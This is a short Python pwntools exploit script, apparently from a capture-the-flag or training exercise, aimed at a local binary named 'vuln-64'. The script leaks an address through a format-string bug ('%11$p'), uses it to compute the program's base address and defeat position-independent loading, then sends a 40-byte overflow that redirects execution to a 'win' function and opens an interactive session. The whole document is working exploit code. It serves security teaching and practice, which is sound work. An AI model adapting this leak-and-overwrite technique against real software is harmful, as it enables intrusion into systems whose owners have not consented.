from pwn import *

elf = context.binary = ELF("./vuln-64")


offset = 11

p = process()
p.recvline()
p.sendline(f"%{offset}$p")


p.recvuntil("you ")
leaked_main = int(p.recvline().decode().strip(),16)
print(hex(leaked_main))
elf.address = leaked_main - elf.sym["main"] - 14



payload = flat([
    b"A" * 40,
    elf.sym["win"] 
])
print(hex(leaked_main))
# gdb.attach(p)
p.sendline(payload)
p.interactive()